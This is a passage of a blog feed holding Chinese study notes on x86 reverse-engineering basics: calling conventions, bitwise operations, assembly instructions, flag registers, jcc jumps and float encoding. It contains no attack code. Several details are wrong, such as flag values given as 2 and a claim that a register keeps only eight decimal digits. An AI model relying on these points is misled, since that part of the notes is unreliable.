class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push <span class="number">2</span></span><br><span class="line">push <span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">15</span>(fun) (<span class="number">00401014</span>)</span><br><span class="line">add esp,<span class="number">8</span></span><br></pre></td></tr></table></figure><p>WindowsAPI的调用方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push <span class="number">2</span></span><br><span class="line">push <span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">10</span>(fun) (<span class="number">0040100f</span>)</span><br><span class="line">函数内部:</span><br><span class="line">ret <span class="number">8</span></span><br><span class="line"><span class="comment">//ret的意思是先ret再esp+8</span></span><br></pre></td></tr></table></figure><p>别的都是用堆栈（内存）传递数据，fastcall用寄存器edx，ecx传递数据。如果经常使用这个函数，应该用这种方式写函数。只有两个函数不需要清理堆栈。用这个约定最好只写两个参数，否则和别的区别不大。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mov edx,<span class="number">2</span></span><br><span class="line">mov ecx,<span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">0</span>(fun) (<span class="number">00401005</span>)</span><br><span class="line">函数内部:</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><br><h1 id="0x05-注意"><a href="#0x05-注意" class="headerlink" title="0x05 注意"></a>0x05 注意</h1><p>函数之前提前push的值不一定是当前函数的参数，因为经过优化之后，可能根本没用到当前参数，而是后面函数的参数。</p>]]></content>
      
      
      <categories>
          
          <category> 2020年8月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向_基础</title>
      <link href="/2020/08/17/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91_%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/08/17/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91_%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-进制01"><a href="#0x01-进制01" class="headerlink" title="0x01 进制01"></a>0x01 进制01</h1><p>十进制的定义是由10个符号组成，逢十进一。</p><p>n进制的定义是由n个符号组成，逢n进一，如果自己定义符号，而不是简单的12345等等，将给解密者带来很大麻烦。</p><p><strong>进制的运算不应该是靠转换，而是查表。</strong></p><br><h1 id="0x02-数据宽度—逻辑运算"><a href="#0x02-数据宽度—逻辑运算" class="headerlink" title="0x02 数据宽度—逻辑运算"></a>0x02 数据宽度—逻辑运算</h1><p>受硬件影响，数据有长度限制，超过宽度的数据会被丢掉。</p><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">or1001100110</span><br><span class="line">_________________________</span><br><span class="line">1011100111</span><br></pre></td></tr></table></figure><p>与</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">and1001100110</span><br><span class="line">_________________________</span><br><span class="line">1001000100</span><br></pre></td></tr></table></figure><p>异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">xor1001100110</span><br><span class="line">_________________________</span><br><span class="line">0010100011</span><br></pre></td></tr></table></figure><p>非</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">not1001100110</span><br><span class="line">__________________________</span><br><span class="line">0110011001</span><br></pre></td></tr></table></figure><h2 id="实际计算"><a href="#实际计算" class="headerlink" title="实际计算"></a>实际计算</h2><p>计算机内部的复杂运算都是用与或非异或等开关来计算的：</p><p>例如2+3</p><p>换成二进制就是0010和0011</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//先把两个异或一下</span><br><span class="line">0010</span><br><span class="line">xor 0011</span><br><span class="line">____________</span><br><span class="line">0001</span><br><span class="line"></span><br><span class="line">//然后再and一下</span><br><span class="line">0010</span><br><span class="line">&amp;0011</span><br><span class="line">____________</span><br><span class="line">0010</span><br></pre></td></tr></table></figure><p>然后把and的结果右移一下，如果右移结果为0，异或的结果就是2+3的答案。如果结果不是0，就把右移完的结果和异或完的结果重新计算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0010 &lt;&lt; 1 == 0100 //因为不是0</span><br><span class="line"></span><br><span class="line">0001</span><br><span class="line">xor0100</span><br><span class="line">___________</span><br><span class="line">0101</span><br><span class="line"></span><br><span class="line">0001</span><br><span class="line">&amp;0100</span><br><span class="line">___________</span><br><span class="line">0000</span><br><span class="line"></span><br><span class="line">0000 &lt;&lt; 1 == 0</span><br><span class="line">//所以2+3的结果为 0101 也就是5</span><br><span class="line">//计算相减其实就是加负数</span><br></pre></td></tr></table></figure><h2 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h2><p>大部分加密解密都是用了异或的概念</p><p>例如加密2014，设置一个密钥5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2014转化为二进制就是 0010 0000 0001 0100</span><br><span class="line">密钥为 0101</span><br><span class="line">加密:</span><br><span class="line">0010 0000 0001 0100</span><br><span class="line">xor0101 0101 0101 0101</span><br><span class="line">_________________________</span><br><span class="line">0111 0101 0100 0001</span><br><span class="line">加密结果为7541</span><br><span class="line">解密:</span><br><span class="line">0111 0101 0100 0001</span><br><span class="line">xor0101 0101 0101 0101</span><br><span class="line">_________________________</span><br><span class="line">0010 0000 0001 0100</span><br></pre></td></tr></table></figure><br><h1 id="0x03-汇编"><a href="#0x03-汇编" class="headerlink" title="0x03 汇编"></a>0x03 汇编</h1><h2 id="32位通用寄存器"><a href="#32位通用寄存器" class="headerlink" title="32位通用寄存器"></a>32位通用寄存器</h2><table><thead><tr><th>32位寄存器</th><th>16位寄存器</th><th>8位寄存器</th><th>主要用途</th><th>编号</th></tr></thead><tbody><tr><td>EAX</td><td>AX</td><td>AL</td><td>累加器</td><td>0</td></tr><tr><td>ECX</td><td>CX</td><td>CL</td><td>计数</td><td>1</td></tr><tr><td>EDX</td><td>DX</td><td>DL</td><td>I/O指针</td><td>2</td></tr><tr><td>EBX</td><td>BX</td><td>BL</td><td>DS段的数据指针</td><td>3</td></tr><tr><td>ESP</td><td>SP</td><td>AH</td><td>堆栈指针</td><td>4</td></tr><tr><td>EBP</td><td>BP</td><td>CH</td><td>SS段的数据指针</td><td>5</td></tr><tr><td>ESI</td><td>SI</td><td>DH</td><td>字符串操作的源指针；SS段的数据指针</td><td>6</td></tr><tr><td>EDI</td><td>DI</td><td>BH</td><td>字符串操作的目标指针；ES段的数据指针</td><td>7</td></tr></tbody></table><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><p><strong>汇编指令由操作码和操作数组成</strong></p><p><code>mov eax,1</code></p><p>mov是操作码，1是源操作数，eax是目标操作数。</p><ul><li>源操作数和目标操作数不能同时为内存单元。</li><li>操作数宽度必须一样</li></ul><p>我们学的是32位寄存器，最多能存储<code>32/4=8</code>个数字。所以如果<code>mov eax,123456789</code>，eax只会存储<code>23456789</code>。</p><hr><p><code>lea eax, dword ptr ds:[12ffc4]</code></p><p>取地址，eax的值为12ffc4，而不是地址中存储的值。</p><hr><p><code>pushad</code>把8个通用寄存器的值存到堆栈里去，用<code>popad</code>弹出。</p><hr><p><code>push，pop</code>不能压入或弹出8位寄存器或者内存。</p><hr><p><code>adc</code>带进位加法，adc ax,bx的意思是a=ax+bx+cf</p><p><code>sbb</code>带进位减法</p><hr><p><code>xchg</code>交换，交换两个寄存器或内存的值。</p><hr><p><code>movs</code>移动数据</p><p><code>movsb</code>的意思是mov byte，移动esi中地址数据到edi中，同时esi,edi都加1；</p><p><code>movsw</code>的意思是mov word，移动esi中地址数据到edi中，同时esi,edi都加2；</p><p><code>movsd</code>的意思是mov dword，移动esi中地址数据到edi中，同时esi,edi都加4。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esi,0x19FF74</span><br><span class="line">mov edi,0x19FF90</span><br><span class="line">movs byte ptr es:[edi],byte ptr ds:[esi]//movsb其实就是这个的简写</span><br></pre></td></tr></table></figure><p>受df标志位影响，如果df标志位为1，则从加变成减。</p><hr><p><code>stos</code>，将AL/AX/EAX的值存储到[EDI]指定的内存单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stos byte ptr es:[edi]//简写为stosb，edi加1；</span><br><span class="line">stos word ptr es:[edi]//简写为stosw，edi加2；</span><br><span class="line">stos dword ptr es:[edi]//简写为stosd，edi加4；</span><br></pre></td></tr></table></figure><p>受df标志位影响，如果df标志位为1，则从加变成减。</p><hr><p><code>rep</code>指令，按计数寄存器（ecx）中指定的次数重复执行字符串指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,10</span><br><span class="line">rep movsd//重复16次</span><br><span class="line">rep stosd//重复16次</span><br></pre></td></tr></table></figure><hr><p><code>jmp</code>指令，修改eip的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short //跳转的值离原来的值小与128字节，就用short</span><br></pre></td></tr></table></figure><hr><p><code>call</code>指令，修改eip的值，并会把下一行指令的地址压入栈。</p><p><strong>call的本质就是jmp 地址，push 下一条指令的地址</strong></p><p><code>retn</code>指令，弹出栈中的地址并跳转。</p><p><strong>retn的本质就是pop eip。</strong></p><hr><p><code>cmp</code>指令：比较两个操作数，<strong>相当于sub指令，但是相减的结构不存，只根据相减的结果改变标志位，当两个操作数相等时，ZF位1。</strong></p><p>一般用于比较两个数是否相等。</p><hr><p><code>test</code>指令：两个数进行与操作，改变标志位。</p><p>一般用于判断寄存器是否等于0。</p><hr><p><code>movsx</code>指令：用于有符号类型转换，先<strong>符号</strong>扩展，再移动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al,0xff</span><br><span class="line">movsx cx,al;cx的值为ffff</span><br><span class="line">mov al,0x1f</span><br><span class="line">movsx cx,al;cx的值为001f</span><br></pre></td></tr></table></figure><p>符号扩展的意思是用符号位填充少的宽度。</p><p><code>movzx</code>指令：用于无符号类型转换，先零扩展，再移动。</p><p>零扩展的意思是用0填充少的宽度。</p><hr><p><code>sete</code>用于设置bool值，可以参照jcc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,dword ptr [ebp+8]</span><br><span class="line">xor ecx,ecx</span><br><span class="line">cmp eax,dword ptr [ebp+0ch]</span><br><span class="line">sete cl</span><br></pre></td></tr></table></figure><p>效果cl=zf，如果[ebp+8]=[ebp+0ch]则eax为1</p><hr><p><code>offset</code>可以看成一个具体的地址</p><br><h2 id="寄存器与内存的区别"><a href="#寄存器与内存的区别" class="headerlink" title="寄存器与内存的区别"></a>寄存器与内存的区别</h2><ol><li>寄存器位于CPU内部，执行速度快，但比较贵</li><li>内存速度相对较慢，但成本低，可以做的很大</li><li>寄存器和内存没有本质上的区别，都是用于存储数据的容器，都是定宽的</li></ol><p>32位的计算机和64位的计算机区别在于寻址能力而不是CPU。</p><p>32位的计算机有32根总线，我们可以理解为32位Bit，一个32位计算机内存寻址的最大范围是<code>0xFFFFFFFF+1</code>（加一是因为包括0）。0xFFFFFFFF+1字节可以转换成4g。所以32位计算机最大只能有4g内存，在大无法识别。并且因为本身自带的硬件占用一些，远远不到4g。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov word DS:ptr[0x12345678], 0xFFFF</span><br></pre></td></tr></table></figure><p>ptr的意思后面是一个指针（指针里面存储了一个地址），word的意思是要读写多少，可以改成<code>byte</code>，<code>word</code>和<code>dword</code></p><p><strong>每个内存单元能存储一个字节。每个字节有个编号，称为内存地址。</strong></p><h2 id="大端序和小端序"><a href="#大端序和小端序" class="headerlink" title="大端序和小端序"></a>大端序和小端序</h2><p>我们首先使用指令：<code>mov dword ptr [0x19FF74],0x23456789</code></p><p>然后会发现数据窗口是这么存储23456789的</p><p><img src="https://i.loli.net/2020/08/20/7Cz2UQ1V3MsGuNF.png" alt="image-20200820124756561.png"></p><p>这是因为字节的存储顺序是小端序，<strong>数据的高位字节存放在内存的高地址</strong></p><p>大端序则是高字节存放在内存的低地址。</p><h2 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h2><p><strong>mov不改变标志位</strong></p><p><strong>是无符号运算还是有符号运算由我们说了算</strong></p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>0</td><td>CF</td><td>进位标志</td></tr><tr><td>2</td><td>PF</td><td>奇偶标志</td></tr><tr><td>4</td><td>AF</td><td>辅助进位标志</td></tr><tr><td>6</td><td>ZF</td><td>零标志</td></tr><tr><td>7</td><td>SF</td><td>符号标志</td></tr><tr><td>8</td><td>TF</td><td>单步标志</td></tr><tr><td>9</td><td>IF</td><td>中断使能标志</td></tr><tr><td>10</td><td>DF</td><td>方向标志</td></tr><tr><td>11</td><td>OF</td><td>溢出标志</td></tr></tbody></table><ol><li>进位标志CF（carry flag）：如果运算结果的最高位产生一个进位或错位，那么其值为1，否则值为0。（无符号数）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,0xEF</span><br><span class="line">ADD AL,2</span><br><span class="line">//CF值为0</span><br><span class="line">MOV AL,0xFE</span><br><span class="line">ADD AL,2</span><br><span class="line">//CF值为1</span><br><span class="line">MOV AL,0xF0</span><br><span class="line">SUB AL,0xFF</span><br><span class="line">//CF值为1</span><br></pre></td></tr></table></figure><hr><ol start="2"><li>奇偶标志PF（Parity Flag）：奇偶标志PF用于反映运算结果中1的个数的奇偶性。如果1的个数为偶数，PF值为1，否则值为0。<strong>（最低有效字节，只看最后八位）</strong>不管32位16位还是8位的数，都只看最后八位有多少1。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,3</span><br><span class="line">ADD AL,3</span><br><span class="line">//3+3=6,0110,PF值为2</span><br><span class="line">ADD AL,2</span><br><span class="line">//6+2=8,1000,PF值为1</span><br></pre></td></tr></table></figure><hr><ol start="3"><li>辅助进位标志AF（Auxiliary Carry Flag）：</li></ol><p>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0。</p><ul><li>在字操作时，发生低字节向高字节进位或借位时</li><li>在字节操作时，发生低4位向高4位进位或借位时</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 0x55EEFFFF</span><br><span class="line">ADD EAX, 2</span><br><span class="line">//AF的值为2</span><br><span class="line">MOV AX, 5EFE</span><br><span class="line">ADD AX, 2</span><br><span class="line">//AF的值为2</span><br><span class="line">MOV AL, 4E</span><br><span class="line">ADD AL, 2</span><br><span class="line">//AF的值为2</span><br></pre></td></tr></table></figure><hr><ol start="4"><li>零标志ZF（Zero Flag），零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XOR EAX, EAX</span><br><span class="line">//EAX清0,ZF值为1</span><br><span class="line">MOV EAX, 2</span><br><span class="line">SUB EAX, 2</span><br><span class="line">//ZF值为1</span><br></pre></td></tr></table></figure><p><strong>如果使用<code>MOV EAX,0</code>是不改变寄存器的</strong></p><hr><ol start="5"><li>符号标志SF（Sign Flag）,符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,7F</span><br><span class="line">ADD AL,2</span><br><span class="line">//7F = 0111 1111</span><br><span class="line">//7f+2 = 81</span><br><span class="line">//81 = 1000 0001</span><br><span class="line">//SF的值为1</span><br></pre></td></tr></table></figure><hr><ol start="6"><li>溢出标志OF（Overflow Flag），溢出标志OF用于反映<strong>有符号数</strong>加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表达的范围，则称为溢出，OF值为1。否则OF的值为0。</li></ol><p>和CF类似，不过这个是有符号数，取决于最高位。最高位由1变成0或者由0变成1，都会改变OF的值。</p><p>正+正=正 如果等于负数，则溢出</p><p>负+负=负 如果等于正数，则溢出</p><p>负+正不会溢出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov al,80</span><br><span class="line">sub al,40</span><br><span class="line">//1000 0000</span><br><span class="line">//+1100 0000</span><br><span class="line">//___________________</span><br><span class="line">//0100 0000</span><br><span class="line">//OF值为1</span><br><span class="line">//减法其实也是加法，只不过加的是有符号数负数。</span><br></pre></td></tr></table></figure><hr><p><img src="https://i.loli.net/2020/08/24/oGWm9J4TOxaAhP1.png"></p><p><strong>80-FF是负数，0到7F是正数</strong></p><h2 id="jcc"><a href="#jcc" class="headerlink" title="jcc"></a>jcc</h2><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>JE，JZ</td><td>结果为0时跳转</td><td>ZF = 1</td></tr><tr><td>JNE，JNZ</td><td>结果不为0时跳转</td><td>ZF = 0</td></tr><tr><td>JS</td><td>结果为负则跳转</td><td>SF = 1</td></tr><tr><td>JNS</td><td>结果为非负则跳转</td><td>SF = 0</td></tr><tr><td>JP，JPE</td><td>结果中1的个数为偶数则跳转</td><td>PF = 1</td></tr><tr><td>JNP，JPO</td><td>结果中1的个数为奇数则跳转</td><td>PF = 0</td></tr><tr><td>JO</td><td>结果溢出则跳转</td><td>OF = 1</td></tr><tr><td>JNO</td><td>结果没有溢出则跳转</td><td>OF = 0</td></tr><tr><td>JB，JNAE</td><td>小于则跳转</td><td>CF = 1</td></tr><tr><td>JNB，JAE</td><td>大于等于则跳转（无符号数）</td><td>CF = 0</td></tr><tr><td>JBE，JNA</td><td>小于等于则跳转（无符号数）</td><td>CF=1 or ZF=1</td></tr><tr><td>JNBE，JA</td><td>大于则跳转（无符号数）</td><td>CF = 0 and ZF=0</td></tr><tr><td>JL，JNGE</td><td>小于则跳转（有符号数）</td><td>SF!=OF</td></tr><tr><td>JNL，JGE</td><td>大于则跳转（有符号数）</td><td>SF=OF</td></tr><tr><td>JLE，JNG</td><td>小于等于则跳转（有符号数）</td><td>ZF=1 or SF!=OF</td></tr><tr><td>JNLE，JG</td><td>大于则跳转（有符号数）</td><td>ZF=0 and SF=OF</td></tr></tbody></table><br><h1 id="0x04-堆栈"><a href="#0x04-堆栈" class="headerlink" title="0x04 堆栈"></a>0x04 堆栈</h1><p>堆栈平衡：调用完一个函数前和调用完一个函数后，堆栈没有变化。</p><p>在函数结束之后的平衡叫做<strong>外平栈</strong></p><br><h1 id="0x05-vc6-0工具使用"><a href="#0x05-vc6-0工具使用" class="headerlink" title="0x05 vc6.0工具使用"></a>0x05 vc6.0工具使用</h1><p>主要是快捷键，vscode没办法反汇编，所以先用着vc6.0</p><p>f5运行</p><p>f7生成文件</p><p>f9下断点</p><p>shift + f5结束程序</p><p>下断点运行之后，才能看内存和寄存器</p><p>反汇编之后：f11 = odf7 ，f10 = odf8</p><br><h1 id="0x06-c语言与反汇编"><a href="#0x06-c语言与反汇编" class="headerlink" title="0x06 c语言与反汇编"></a>0x06 c语言与反汇编</h1><h2 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">返回类型 __declspec(naked) 函数名(形参)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器不会管裸函数，我们可以在裸函数里面直接写汇编</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __declspec(naked) <span class="built_in">fun</span>()&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不写ret的话里面一行汇编都没有，会导致函数call完无法返回，所以我们加ret让这个函数正确执行。</p><h2 id="控制台程序的入口"><a href="#控制台程序的入口" class="headerlink" title="控制台程序的入口"></a>控制台程序的入口</h2><p>KERNEL32调用mainCRTStartup()函数，然后mainCRTStartup()调用main函数。</p><p>main函数被调用前要先调用的函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetVersion</span>()<span class="comment">//获取当前操作系统的版本</span></span><br><span class="line">_head_init()<span class="comment">//初始化堆栈空间大小</span></span><br><span class="line"><span class="built_in">GetCommandLineA</span>()<span class="comment">//获取命令行参数</span></span><br><span class="line">_crtGetEnvironmentStringsA()<span class="comment">//获取环境变量</span></span><br><span class="line">_setargv()</span><br><span class="line">_setenvp()</span><br><span class="line">_cinit()</span><br></pre></td></tr></table></figure><p>main函数经过vc6编译会变成3个参数。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型的三个要素：</p><ol><li><p>存储数据的宽度</p></li><li><p>存储数据的格式</p></li><li><p>作用域</p></li></ol><hr><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><table><thead><tr><th>整数类型</th><th>bit</th><th>字节</th><th>宽度</th></tr></thead><tbody><tr><td>char</td><td>8bit</td><td>1字节</td><td>byte</td></tr><tr><td>short</td><td>16bit</td><td>2字节</td><td>word</td></tr><tr><td>int</td><td>32bit</td><td>4字节</td><td>dword</td></tr><tr><td>long</td><td>32bit</td><td>4字节</td><td>dword</td></tr></tbody></table><p>unsigned无符号数</p><p>有符号数和无符号数在内存中是完全一样的，只是看你想怎么用它。</p><hr><h3 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h3><p><strong>浮点数是如何存储到内存中的：</strong></p><p>float的存储方式</p><p><img src="https://i.loli.net/2020/08/28/hW4Ju7lbHOE3ZCt.png" alt="image-20200828213506250.png"></p><ol><li>先将这个浮点数的绝对值值化为二进制</li><li>将这个二进制数的小数点左移或者右移n位，直到小数点移动到前面只剩一个1</li><li>从小数点右边第一位开始数出二十三位数字放入第22到第0位。</li><li>如果实数是正的，则在第31位放入0，否则放入1。</li><li>如果n是左移得到的，说明指数是正的，第30位放入1。如果n是右移得到的或n=0，则在第30位放入0。</li><li>将n减去1后化为二进制，把值去掉第一位放入第29到第23位（7位）。</li></ol><p>因为float尾数部分只有24位，所以能精确到小数点后六位。不存在无符号float，因为第一位就是符号位了。</p><p><strong>double是64位的，8个字节（float是4个字节）</strong></p><br><p>首先把浮点数转换为二进制</p><p>例：8.25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">整数部分转换：</span><br><span class="line">8/2 = 40</span><br><span class="line">4/2 = 20</span><br><span class="line">2/2 = 10</span><br><span class="line">1/2 = 0 1</span><br><span class="line">1000</span><br><span class="line">小数部分转换：</span><br><span class="line">0.25*2 = 0.50</span><br><span class="line">0.5*2  = 1.01</span><br><span class="line">1000.01</span><br></pre></td></tr></table></figure><p>8.25可以用二进制表示为1000.01</p><p>但如果是8.4就会进入死循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0.4 * 2 = 0.80</span><br><span class="line">0.8 * 2 = 1.61</span><br><span class="line">0.6 * 2 = 1.21</span><br><span class="line">0.2 * 2 = 0.40</span><br></pre></td></tr></table></figure><p>这时候需要精确位数。</p><p>接着8.25继续，将小数点右移或者左移</p><p>1.00001 * 2^3</p><p>然后把00001存到尾数部分，后面跟着步骤来。</p><table><thead><tr><th>31符号位</th><th>23~30指数部分</th><th>0~22位数部分</th></tr></thead><tbody><tr><td>0</td><td>10000010</td><td>00001000000000000000000</td></tr></tbody></table><p>所以在内存中存入的值是41040000。</p><p> 如果是-8.25，也只需要变符号位</p><table><thead><tr><th>31符号位</th><th>23~30指数部分</th><th>0~22位数部分</th></tr></thead><tbody><tr><td>1</td><td>10000010</td><td>00001000000000000000000</td></tr></tbody></table><p>在内存中存入的值就是c1040000。</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>标准aciss码由1个字节组成，最高位为0。</p><p>gb2312由2个字节组成，最高位为1。</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>从逆向的角度来说</p><p>执行最快的是do while循环，其次是while循环，效率最差的是for循环。</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p><code>struct</code></p><p>基值就是全局变量，偏移就是结构体中的一个一个的属性。</p><p><strong>结构特别大的时候，是通过堆栈复制传到函数中的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 